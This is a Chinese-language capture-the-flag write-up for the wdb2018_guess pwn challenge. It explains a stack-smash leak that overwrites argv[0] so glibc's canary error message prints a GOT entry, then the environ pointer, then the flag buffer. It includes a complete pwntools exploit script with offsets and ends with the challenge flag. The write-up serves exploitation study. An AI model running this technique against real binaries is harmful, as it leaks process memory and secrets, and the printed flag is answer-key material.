# wdb2018_guess

[题目地址](https://buuoj.cn/challenges#wdb2018_guess)

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

不细看还以为这道题是那种溢出覆盖`\x00`然后输出的题，结果再仔细看一眼main，嗯你怎么不输出？

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch] BYREF
  __int64 v6; // [rsp+20h] [rbp-80h]
  __int64 v7; // [rsp+28h] [rbp-78h]
  char buf[48]; // [rsp+30h] [rbp-70h] BYREF
  char s2[56]; // [rsp+60h] [rbp-40h] BYREF
  unsigned __int64 v10; // [rsp+98h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  v7 = 3LL;
  LODWORD(stat_loc.__uptr) = 0;
  v6 = 0LL;
  sub_4009A6(a1, a2, a3);
  HIDWORD(stat_loc.__iptr) = open("./flag.txt", 0);
  if ( HIDWORD(stat_loc.__iptr) == -1 )
  {
    perror("./flag.txt");
    _exit(-1);
  }
  read(SHIDWORD(stat_loc.__iptr), buf, 0x30uLL);
  close(SHIDWORD(stat_loc.__iptr));
  puts("This is GUESS FLAG CHALLENGE!");
  while ( 1 )
  {
    if ( v6 >= v7 )
    {
      puts("you have no sense... bye :-) ");
      return 0LL;
    }
    if ( !(unsigned int)sub_400A11() )
      break;
    ++v6;
    wait((__WAIT_STATUS)&stat_loc);
  }
  puts("Please type your guessing flag");
  gets(s2);
  if ( !strcmp(buf, s2) )
    puts("You must have great six sense!!!! :-o ");
  else
    puts("You should take more effort to get six sence, and one more challenge!!");
  return 0LL;
}
```

不懂了。搜了[wp](https://blog.csdn.net/Y_peak/article/details/115470540)得知这题是[stack smash](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-smash)考点。stack smash有点反其道而行之，平时我们看见canary都是想办法绕过去，这个技巧倒好，就是要你报`*** stack smashing detected ***`。

```
This is GUESS FLAG CHALLENGE!
Please type your guessing flag
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
You should take more effort to get six sence, and one more challenge!!
*** stack smashing detected ***: ./pwn/pwn terminated
```

这是测试时输出的内容。`*** stack smashing detected ***`不是重点，重点是后面的`./pwn/pwn`。这个值并不是固定的，它的值取决于argv[0]指向的内容，一般都是文件名。有一个致命的问题，argv[0]是存在栈上的，我们可以溢出过去，覆盖原本的argv[0]为got表什么的，就能泄露地址了。

需要动调得到argv[0]距离溢出点的位置，这道题是0x128。此题还涉及到了另一个知识点——environ环境变量，可参考这篇[文章](https://bbs.pediy.com/thread-258248.htm)。

- 在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。从以下结果可知环境指针 environ 在栈空间的高地址处。因此，可通过 environ 指针泄露栈地址

利用environ获取栈上任意一个变量地址有两步：

1. 得到libc地址后，libc基址+_environ的偏移量=_environ的地址
2. 通过_environ的地址得到_environ的值，从而得到环境变量地址，环境变量保存在栈中，所以通过栈内的偏移量，可以访问栈中任意变量

```python
from pwn import *
p = remote('node4.buuoj.cn',28151)
puts_got = 0x602020

p.sendlineafter('Please type your guessing flag',b'a'*0x128 + p64(puts_got)) #先泄露libc地址，0x128个a是填充，让puts_got得以覆盖到argv[0]
p.recvuntil('stack smashing detected ***: ')
puts_addr = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = puts_addr - 456336
log.success('libc_base :' + hex(libc_base))
environ = libc_base + 3960632
info('environ_addr=',hex(environ))
p.sendlineafter('Please type your guessing flag',b'a'*0x128 + p64(environ)) #然后泄露environ地址
p.recvuntil('stack smashing detected ***: ')
buf_addr = u64(p.recv(6).ljust(8,b'\x00')) - 0x168 #这是environ地址距离flag字符串地址的偏移，需要动调计算
log.success('flag_addr=',hex(buf_addr))
p.sendlineafter('Please type your guessing flag',b'a'*0x128 + p64(buf_addr)) #这次覆盖为buf地址，canary报错就可以得到flag了
p.interactive() 
```

## Flag
> flag{bbc90eca-87e9-4a3a-81bb-6abfef946443}